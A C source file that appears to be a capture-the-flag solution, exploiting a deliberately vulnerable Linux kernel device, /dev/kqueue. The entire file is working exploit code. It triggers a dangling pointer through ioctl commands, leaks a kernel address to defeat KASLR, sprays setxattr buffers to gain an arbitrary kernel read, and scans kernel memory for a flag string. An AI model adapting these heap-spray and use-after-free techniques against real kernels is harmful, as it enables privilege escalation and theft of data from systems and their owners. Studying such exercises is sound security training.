// gcc -static exploit.c -o exploit

#include <stdio.h>
#include <sys/syscall.h>
#include <unistd.h>
#include <fcntl.h>
#include <stdint.h>
#include <assert.h>
#include <sys/ioctl.h>
#include <sys/xattr.h>
#include <sys/mman.h>

#define DEVICE_NAME "/dev/kqueue"
#define CMD1	0x1314001
#define CMD2	0x1314002

// This exploit is not perfect, I was only able to get arbitrary read.
// And tried to read the flag with it, you may wait for 1H before getting the flag xD

int fd = -1;

void open_device()
{
	assert((fd = open(DEVICE_NAME, O_RDWR)) > 0);
}

void send_cmd1(uint64_t *val)
{
	int ret = ioctl(fd, CMD1, val);
	printf("CMD1 ret %d\n", ret);
}

void send_cmd2(uint64_t *val)
{
	int ret = ioctl(fd, CMD2, val);
	printf("CMD2 ret %d\n", ret);
}
int i = 0x10;

uint64_t get_leak(uint64_t *mem)
{
	return mem[0];
}

uint64_t arb_read(uint64_t *mem, uint64_t val)
{
	uint64_t buf[4];
	char r[0x10];
	buf[0] = 0x4d4d4d4d4d4d4d4d;
	buf[1] = 0x4d4d4d4d4d4d4d4d;
	buf[2] = (uint64_t)val - 0x8;
	buf[3] = 0x4d4d4d4d4d4d4d4d;
	for(int j=0; j<i; j++) {
		sprintf(r, "%d", i);
		setxattr("/tmp", r, buf, 0x20, XATTR_REPLACE);
	}
	i += 0x10;
	uint64_t leak = 0;
	send_cmd2(mem);
	leak = 0xff00000000000000 | get_leak((uintptr_t)mem - 1) >> 8;
	printf("Leak @ %lx\n", leak);
	return leak;
}

int main()
{
	int stat[0x10];

	printf("Exploit started!\n");

	// Let's start by opening the device.
	// I will look at how to make reversing easier.
	// After investigation I found that it's using kmalloc-32
	open_device();

	// To make __copy_from_user() fail and return a value that's not zero.
	// Now we have a dangling pointer at queue->next[1].d and queue->prev[1].d
	send_cmd1((uint64_t *)0x4d4d4d4d4d4d4d4d);

	for(int i = 0; i<0x1; i++)
	{
		stat[i] = open("/proc/self/stat", O_RDWR);
		assert(stat[i] > 0);
	}

	uint64_t leak = 0;
	send_cmd2(&leak);
	printf("Leak @ %lx\n", leak);
	uint64_t kernel_base = leak - 0x10d4b0;
	printf("Kernel base @ %lx\n", kernel_base);
	uint64_t init_task = kernel_base + 0xa11480;
	printf("init_task %lx\n", init_task);
	for(int i = 0; i<0x1; i++)
	{
		close(stat[i]);
	}
	
	uint64_t *mem = mmap(NULL, 0x1000, PROT_READ|PROT_WRITE, MAP_ANONYMOUS|MAP_PRIVATE, -1, 0);
	printf("mem is at %p\n", mem);
	mem = (char*)mem + 0x1000 - 0x7;
	getchar();
	leak = arb_read(mem, (uint64_t )init_task + 0x50);
	getchar();
	uint64_t l;
	for(;;)
	{
		printf("LOOKING HERE: %p\n", leak);
		l = arb_read(mem, leak);
		if (l & 0xffffffff == 0x67616c66)
		{
			printf("Found it!");
			arb_read(mem, leak + 8);
			arb_read(mem, leak + 8*2);
			arb_read(mem, leak + 8*3);
			arb_read(mem, leak + 8*4);
			arb_read(mem, leak + 8*5);
			break;
		}
		leak += 8;
	}
	return 0;
}
